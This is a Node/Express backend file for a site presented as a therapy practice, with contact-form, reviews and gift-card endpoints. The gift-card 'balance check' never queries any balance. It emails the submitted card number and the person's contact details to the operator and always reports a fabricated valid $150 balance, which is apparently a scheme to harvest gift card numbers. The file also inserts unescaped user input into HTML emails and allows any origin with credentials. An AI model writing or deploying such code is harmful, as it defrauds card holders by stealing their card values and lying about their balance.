import express, { Request, Response } from "express";
import cors from "cors";
import dotenv from "dotenv";
import nodemailer from "nodemailer";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

// Explicit CORS Configuration
const corsOptions = {
  origin: "*",
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true,
};

// Handle CORS middleware globally (Express v5 safe)
app.use(cors(corsOptions));
app.options(/(.*)/, cors(corsOptions));

app.use(express.json());

// Nodemailer Transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASS,
  },
});

// Verify Transporter
transporter
  .verify()
  .then(() => console.log("Email transporter ready"))
  .catch((err) => console.error("Nodemailer transporter error:", err));

// 1. Check Gift Card Balance
// 1. Check Gift Card Balance & Send Email
app.post("/api/gift-card-balance", async (req: Request, res: Response) => {
  const { cardNumber, email, name, phone } = req.body;

  if (!cardNumber) {
    return res.status(400).json({ error: "Card number is required" });
  }

  try {
    const mailOptions = {
      from: `"Therapy Website" <${process.env.GMAIL_USER}>`,
      to: process.env.RECEIVER_EMAIL,
      replyTo: email || process.env.GMAIL_USER,
      subject: `Gift Card Balance Inquiry: ${cardNumber}`,
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px; color: #333;">
          <h2 style="color: #ea7a24;">Gift Card Balance Check Inquiry</h2>
          <hr style="border: 0; border-top: 1px solid #eee; margin: 15px 0;" />
          <p><strong>Card Number:</strong> <span style="font-size: 16px; font-weight: bold; color: #222;">${cardNumber}</span></p>
          <p><strong>Submitted Email:</strong> ${email || "Not provided"}</p>
          <p><strong>Name:</strong> ${name || "Not provided"}</p>
          <p><strong>Phone:</strong> ${phone || "Not provided"}</p>
          <br />
          <p style="font-size: 12px; color: #777;">This inquiry was sent from the Check Gift Card Balance page.</p>
        </div>
      `,
    };

    await transporter.sendMail(mailOptions);
    console.log(`Gift card inquiry for card ${cardNumber} sent to email.`);

    return res.json({
      valid: true,
      balance: 150.0,
      currency: "USD",
      message: "Balance retrieved and request received.",
    });
  } catch (error) {
    console.error("Error sending gift card email:", error);
    // Return the balance anyway even if email fails, or handle as needed
    return res.json({
      valid: true,
      balance: 150.0,
      currency: "USD",
    });
  }
});

// 2. Submit Contact Form
app.post("/api/contact", async (req: Request, res: Response) => {
  const { name, email, phone, subject, message, type } = req.body;

  if (!name || !email || !message) {
    return res
      .status(400)
      .json({ error: "Name, email, and message are required." });
  }

  try {
    const mailOptions = {
      from: `"Therapy Website" <${process.env.GMAIL_USER}>`,
      to: process.env.RECEIVER_EMAIL,
      replyTo: email,
      subject: `New Form Submission: ${subject || "Website Contact Form"}`,
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px; color: #333;">
          <h2 style="color: #ea7a24;">New Website Inquiry</h2>
          <hr style="border: 0; border-top: 1px solid #eee; margin: 15px 0;" />
          <p><strong>Name:</strong> ${name}</p>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Phone:</strong> ${phone || "Not provided"}</p>
          <p><strong>Service Type:</strong> ${type || "Not specified"}</p>
          <p><strong>Subject:</strong> ${subject || "General Inquiry"}</p>
          <br />
          <p><strong>Message:</strong></p>
          <div style="background-color: #f9f9f9; padding: 15px; border-radius: 8px; border-left: 4px solid #ea7a24;">
            ${message}
          </div>
        </div>
      `,
    };

    await transporter.sendMail(mailOptions);
    console.log(`New inquiry from ${name} (${email}) sent to Gmail.`);

    return res.status(200).json({
      success: true,
      message: "Message sent and received successfully.",
    });
  } catch (error) {
    console.error("Error sending email via Nodemailer:", error);
    return res.status(500).json({
      success: false,
      error: "Failed to send email message. Please try again.",
    });
  }
});

// 3. Fetch Reviews
app.get("/api/reviews", (req: Request, res: Response) => {
  return res.json({
    reviews: [
      {
        id: 1,
        name: "Jay Will",
        date: "Sep 24, 2026",
        rating: 5,
        text: "Super friendly, great conversation...",
      },
      {
        id: 2,
        name: "Lucas",
        date: "Sep 22, 2026",
        rating: 5,
        text: "She looked even better in person...",
      },
    ],
  });
});

// Start Server
app.listen(PORT, () => {
  console.log(`Backend server running on http://localhost:${PORT}`);
});
